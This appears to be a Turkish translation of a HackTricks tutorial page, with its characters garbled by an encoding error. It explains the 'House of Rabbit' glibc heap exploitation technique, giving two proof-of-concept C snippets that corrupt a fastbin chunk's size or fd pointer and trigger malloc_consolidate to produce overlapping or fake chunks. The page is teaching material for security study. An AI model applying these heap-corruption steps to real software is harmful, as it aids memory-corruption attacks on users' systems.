# TavÅŸan Evi

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahramana kadar AWS hacklemeyi Ã¶ÄŸrenin!</summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **ğŸ’¬ [**Discord grubumuza**](https://discord.gg/hRep4RUj7f) katÄ±lÄ±n veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)'da takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

### Gereksinimler

1. **HÄ±zlÄ± bin fd iÅŸaretÃ§isini veya boyutunu deÄŸiÅŸtirme yeteneÄŸi**: Bu, hÄ±zlÄ± binde bir parÃ§anÄ±n ileri iÅŸaretÃ§isini veya boyutunu deÄŸiÅŸtirebileceÄŸiniz anlamÄ±na gelir.
2. **`malloc_consolidate`'i tetikleme yeteneÄŸi**: Bu, bÃ¼yÃ¼k bir parÃ§a tahsis ederek veya Ã¼st parÃ§ayÄ± birleÅŸtirerek yapÄ±labilir, bu da yÄ±ÄŸÄ±nÄ± parÃ§alarÄ± birleÅŸtirmeye zorlar.

### Hedefler

1. **Ãœst Ã¼ste binen parÃ§alar oluÅŸturmak**: BaÅŸka bir parÃ§ayla Ã¶rtÃ¼ÅŸen bir parÃ§a oluÅŸturarak yÄ±ÄŸÄ±n manipÃ¼lasyonlarÄ±na olanak tanÄ±mak.
2. **Sahte parÃ§alar oluÅŸturmak**: YalancÄ± bir parÃ§ayÄ± yÄ±ÄŸÄ±n iÅŸlemleri sÄ±rasÄ±nda meÅŸru bir parÃ§a olarak algÄ±lamak iÃ§in tahsildarÄ± kandÄ±rmak.

## SaldÄ±rÄ± AdÄ±mlarÄ±

### POC 1: HÄ±zlÄ± bin parÃ§a boyutunu deÄŸiÅŸtirme

**AmaÃ§**: Bir hÄ±zlÄ± bin parÃ§asÄ±nÄ±n boyutunu manipÃ¼le ederek Ã¼st Ã¼ste binen bir parÃ§a oluÅŸturmak.

* **AdÄ±m 1: ParÃ§alar Tahsis Etme**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x40);  // Allocates another chunk of 0x40 bytes at 0x602050
malloc(0x10);                          // Allocates a small chunk to change the fastbin state
```
* **AdÄ±m 2: ParÃ§alarÄ± Serbest BÄ±rakÄ±n**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
free(chunk2);  // Frees the chunk at 0x602050
```
* **AdÄ±m 3: ParÃ§a Boyutunu DeÄŸiÅŸtirme**
```cpp
chunk1[-1] = 0xa1;  // Modify the size of chunk1 to 0xa1 (stored just before the chunk at chunk1[-1])
```
* **AdÄ±m 4: `malloc_consolidate`'i Tetikleyin**
```cpp
malloc(0x1000);  // Allocate a large chunk to trigger heap consolidation
```
BÃ¼yÃ¼k bir parÃ§a ayÄ±rmak, kÃ¼Ã§Ã¼k parÃ§alarÄ± hÄ±zlÄ± kutuya birleÅŸtiren `malloc_consolidate` iÅŸlevini tetikler. `chunk1`'in manipÃ¼le edilen boyutu, `chunk2` ile Ã¶rtÃ¼ÅŸmesine neden olur.

Konsolidasyondan sonra, `chunk1`, `chunk2` ile Ã¶rtÃ¼ÅŸerek daha fazla sÃ¶mÃ¼rÃ¼me izin verir.

### POC 2: `fd` iÅŸaretÃ§isini deÄŸiÅŸtir

**AmaÃ§**: HÄ±zlÄ± kutu `fd` iÅŸaretÃ§isini manipÃ¼le ederek sahte bir parÃ§a oluÅŸturmak.

* **AdÄ±m 1: ParÃ§alarÄ± AyÄ±rma**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x100); // Allocates a chunk of 0x100 bytes at 0x602050
```
**AÃ§Ä±klama**: Sahte parÃ§a iÃ§in heap'i kurmak iÃ§in daha kÃ¼Ã§Ã¼k ve daha bÃ¼yÃ¼k olmak Ã¼zere iki parÃ§a tahsis ediyoruz.

* **AdÄ±m 2: Sahte parÃ§a oluÅŸturun**
```cpp
chunk2[1] = 0x31;  // Fake chunk size 0x30
chunk2[7] = 0x21;  // Next fake chunk
chunk2[11] = 0x21; // Next-next fake chunk
```
* **AdÄ±m 3: `chunk1`'i serbest bÄ±rakÄ±n**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
```
**AÃ§Ä±klama**: `chunk1`'i serbest bÄ±rakÄ±yoruz, onu fastbin listesine ekliyoruz.

* **AdÄ±m 4: `chunk1`'in `fd`'sini deÄŸiÅŸtirin**
```cpp
chunk1[0] = 0x602060;  // Modify the fd of chunk1 to point to the fake chunk within chunk2
```
**AÃ§Ä±klama**: `chunk1`'in ileri iÅŸaretÃ§isini (`fd`) `chunk2` iÃ§indeki sahte parÃ§aya iÅŸaret edecek ÅŸekilde deÄŸiÅŸtiriyoruz.

* **AdÄ±m 5: `malloc_consolidate`'i Tetikle**
```cpp
malloc(5000);  // Allocate a large chunk to trigger heap consolidation
```
Bir bÃ¼yÃ¼k parÃ§a yeniden tahsis edildiÄŸinde `malloc_consolidate` tetiklenir, sahte parÃ§ayÄ± iÅŸler.

Sahte parÃ§a, fastbin listesinin bir parÃ§asÄ± haline gelir, bu da onu daha fazla sÃ¶mÃ¼rÃ¼ iÃ§in geÃ§erli bir parÃ§a haline getirir.

### Ã–zet

**House of Rabbit** tekniÄŸi, ya bir fast bin parÃ§asÄ±nÄ±n boyutunu deÄŸiÅŸtirerek Ã§akÄ±ÅŸan parÃ§alar oluÅŸturmayÄ± ya da sahte parÃ§alar oluÅŸturmak iÃ§in `fd` iÅŸaretÃ§isini manipÃ¼le etmeyi iÃ§erir. Bu, saldÄ±rganlarÄ±n yasal parÃ§alarÄ± heap'te oluÅŸturmalarÄ±na olanak tanÄ±r ve Ã§eÅŸitli sÃ¶mÃ¼rÃ¼ biÃ§imlerini etkinleÅŸtirir. Bu adÄ±mlarÄ± anlamak ve uygulamak, heap sÃ¶mÃ¼rÃ¼ becerilerinizi geliÅŸtirecektir.
